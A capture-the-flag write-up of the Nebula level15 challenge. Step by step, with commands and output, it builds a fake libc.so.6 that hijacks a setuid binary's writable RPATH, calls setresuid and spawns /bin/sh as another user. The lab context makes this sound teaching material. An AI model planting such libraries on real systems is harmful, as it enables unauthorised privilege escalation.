+++
author = "pwntester"
categories = ["nebula15"]
date = 2013-11-26T15:42:00Z
description = ""
draft = false
slug = "nebula-level15-write-up"
tags = ["nebula15"]
title = "Nebula level15 write-up"

+++

In [Level 15](http://exploit-exercises.com/nebula/level15) we are given the following description:

> **strace** the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
> You may wish to review how to "compile a shared library in linux" and how the libraries are loaded and processed by reviewing the **dlopen** manpage in depth.
> Clean up after yourself :)

As suggested by the challange, we execute **strace**:

```lang-bash line-numbers 
level15@nebula:/home/flag15$ strace ./flag15
execve("./flag15", ["./flag15"], [/* 20 vars */]) = 0
brk(0)                                  = 0x9e8f000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7783000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbf8c7444) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=4096, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=19771, ...}) = 0
mmap2(NULL, 19771, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb777e000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xc19000
mmap2(0xd8f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xd8f000
mmap2(0xd92000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xd92000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb777d000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb777d8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xd8f000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xfdf000, 4096, PROT_READ)     = 0
munmap(0xb777e000, 19771)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7782000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
```

Ok, it looks like the binary is trying to load **lib.so.6** from different locations including **/var/tmp/flag15** where we have write permissions, and since it fails, it ends up loading the system libc (/lib/i386-linux-gnu/libc.so.6), then it writes "strace it!" and quits.

Lets take a look at binary:

```lang-bash line-numbers 
level15@nebula:/home/flag15$ objdump -p flag15

flag15:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r-x
  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x000005d4 memsz 0x000005d4 flags r-x
    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12
         filesz 0x00000108 memsz 0x00000110 flags rw-
 DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2
         filesz 0x000000d0 memsz 0x000000d0 flags rw-
    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2
         filesz 0x00000034 memsz 0x00000034 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
         filesz 0x00000000 memsz 0x00000000 flags rw-
   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0
         filesz 0x000000f4 memsz 0x000000f4 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15
  INIT                 0x080482c0
  FINI                 0x080484ac
  GNU_HASH             0x080481ac
  STRTAB               0x0804821c
  SYMTAB               0x080481cc
  STRSZ                0x0000005a
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x08049ff4
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x080482a8
  REL                  0x080482a0
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x08048280
  VERNEEDNUM           0x00000001
  VERSYM               0x08048276

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0
```

The private headers show us a couple of interesting things, the binary uses shared libs and requires **libc.so.6**, the binary was compiled with **RPATH**. which is a term in programming which refers to a run-time search path hard-coded in an executable file or library, used during dynamic linking to find the libraries the executable or library requires. The cool thing about RPATH is that libraries loaded from the run-time path wont disable te setuid execution as **LD_PRELOAD** would do. So we can inject our own **libc.so.6** (Using version GLIBC_2.0 as required by the binary) in the **RPATH** directory and hook any of the used functions to execute our setuid shell. Lets see what functions does our binary use from **libc**:

```lang-bash line-numbers 
level15@nebula:/home/flag15$ objdump -R flag15

flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
```

From [Linuxbase](http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html):

> The __libc_start_main() function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function.

And for [__gmon_start__](http://stackoverflow.com/questions/12697081/what-is-gmon-start-symbol):

> The function call_gmon_start initializes the gmon profiling system. This system is enabled when binaries are compiled with the -pg flag, and creates output for use with gprof(1). In the case of the scenario binary call_gmon_start is situated directly proceeding that _start function. The call_gmon_start function finds the last entry in the Global Offset Table (also known as __gmon_start__) and, if not NULL, will pass control to the specified address. The __gmon_start__ element points to the gmon initialization function, which starts the recording of profiling information and registers a cleanup function with atexit(). In our case however gmon is not in use, and as such __gmon_start__ is NULL.

So both of them look like good places to hook up our shell, but since Im more familiar with **__libc_start_main()**, I will inject the shell there:

```lang-bash line-numbers 
level15@nebula:/var/tmp$ mkdir flag15
level15@nebula:/var/tmp$ cd flag15
level15@nebula:/var/tmp/flag15$ cat shell.c
#include <linux/unistd.h>

int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
  system("/bin/sh");
}
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 shell.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

Ok, our library was injected but it looks like it is missing a symbol:

```lang-bash line-numbers 
level15@nebula:/var/tmp/flag15$ cat shell.c
#include <linux/unistd.h>


void __cxa_finalize (void *d) {
    return;
}

int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
  system("/bin/sh");
}
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

We need to provide version info to our library and it should be compatible with **GLIBC_2.0**. Googling around we find the following link that explains how to do it: [version-script]():

```lang-bash line-numbers 
level15@nebula:/var/tmp/flag15$ cat version
GLIBC_2.0 { };
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 shell.c -Wl,--version-script=version
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol execve, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

WTF!?? Im still getting the same error. Lets copy the flag15 file to remove the setuid flag and use **LD_DEBUG** to gain some insights:

```lang-bash line-numbers 
level15@nebula:/var/tmp/flag15$ cp /home/flag15/flag15 .
level15@nebula:/var/tmp/flag15$ LD_DEBUG=all ./flag15
      6769:
      6769:	file=libc.so.6 [0];  needed by ./flag15 [0]
      6769:	find library=libc.so.6 [0]; searching
      6769:	 search path=/var/tmp/flag15/tls/i686/sse2/cmov:/var/tmp/flag15/tls/i686/sse2:/var/tmp/flag15/tls/i686/cmov:/var/tmp/flag15/tls/i686:/var/tmp/flag15/tls/sse2/cmov:/var/tmp/flag15/tls/sse2:/var/tmp/flag15/tls/cmov:/var/tmp/flag15/tls:/var/tmp/flag15/i686/sse2/cmov:/var/tmp/flag15/i686/sse2:/var/tmp/flag15/i686/cmov:/var/tmp/flag15/i686:/var/tmp/flag15/sse2/cmov:/var/tmp/flag15/sse2:/var/tmp/flag15/cmov:/var/tmp/flag15		(RPATH from file ./flag15)
      6769:	  trying file=/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/tls/i686/sse2/libc.so.6
      6769:	  trying file=/var/tmp/flag15/tls/i686/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/tls/i686/libc.so.6
      6769:	  trying file=/var/tmp/flag15/tls/sse2/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/tls/sse2/libc.so.6
      6769:	  trying file=/var/tmp/flag15/tls/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/tls/libc.so.6
      6769:	  trying file=/var/tmp/flag15/i686/sse2/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/i686/sse2/libc.so.6
      6769:	  trying file=/var/tmp/flag15/i686/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/i686/libc.so.6
      6769:	  trying file=/var/tmp/flag15/sse2/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/sse2/libc.so.6
      6769:	  trying file=/var/tmp/flag15/cmov/libc.so.6
      6769:	  trying file=/var/tmp/flag15/libc.so.6
      6769:
      6769:	file=libc.so.6 [0];  generating link map
      6769:	  dynamic: 0x00f6af18  base: 0x00f69000   size: 0x00002014
      6769:	    entry: 0x00f69310  phdr: 0x00f69034  phnum:          7
      6769:
      6769:	checking for version `GLIBC_2.0' in file /var/tmp/flag15/libc.so.6 [0] required by file ./flag15 [0]
      6769:	checking for version `GLIBC_2.0' in file /var/tmp/flag15/libc.so.6 [0] required by file /var/tmp/flag15/libc.so.6 [0]
      6769:
      6769:	relocation processing: /var/tmp/flag15/libc.so.6 (lazy)
      6769:	symbol=__gmon_start__;  lookup in file=./flag15 [0]
      6769:	symbol=__gmon_start__;  lookup in file=/var/tmp/flag15/libc.so.6 [0]
      6769:	symbol=_Jv_RegisterClasses;  lookup in file=./flag15 [0]
      6769:	symbol=_Jv_RegisterClasses;  lookup in file=/var/tmp/flag15/libc.so.6 [0]
      6769:
      6769:	relocation processing: ./flag15 (lazy)
      6769:	symbol=__gmon_start__;  lookup in file=./flag15 [0]
      6769:	symbol=__gmon_start__;  lookup in file=/var/tmp/flag15/libc.so.6 [0]
      6769:
      6769:	calling init: /var/tmp/flag15/libc.so.6
      6769:
      6769:	symbol=__libc_start_main;  lookup in file=./flag15 [0]
      6769:	symbol=__libc_start_main;  lookup in file=/var/tmp/flag15/libc.so.6 [0]
      6769:	binding file ./flag15 [0] to /var/tmp/flag15/libc.so.6 [0]: normal symbol `__libc_start_main' [GLIBC_2.0]
      6769:	symbol=system;  lookup in file=./flag15 [0]
      6769:	symbol=system;  lookup in file=/var/tmp/flag15/libc.so.6 [0]
      6769:	/var/tmp/flag15/libc.so.6: error: relocation error: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference (fatal)
```

Ok, in the lst lines, we can see that the symbol **__libc_start_main** was found on our injected library, but the symbol **system** is nowhere to be found. We can compile our library statically so it includes all the dependencies it needs:

```lang-bash line-numbers 
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 shell.c
level15@nebula:/var/tmp/flag15$ ./flag15
sh-4.2$ id
uid=1016(level15) gid=1016(level15) groups=1016(level15)
```

Nice, it worked! now, lets try it with the original setuid binary:

```lang-bash line-numbers 
sh-4.2$ id
uid=1016(level15) gid=1016(level15) euid=984(flag15) groups=984(flag15),1016(level15)
```

Oopps effective uid is **flag15** but we are still **level15**, we forgot to apply the effective uid before calling to system, lets add a **setresuid()** call to set the effective uid as real one:

```lang-bash line-numbers 
level15@nebula:/var/tmp/flag15$ cat shell.c
#include <linux/unistd.h>

void __cxa_finalize (void *d) {
    return;
}

int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
  setresuid(geteuid(),geteuid(),geteuid());
  system("/bin/sh");
}
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 shell.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
sh-4.2$ id
uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)
```

Voila!
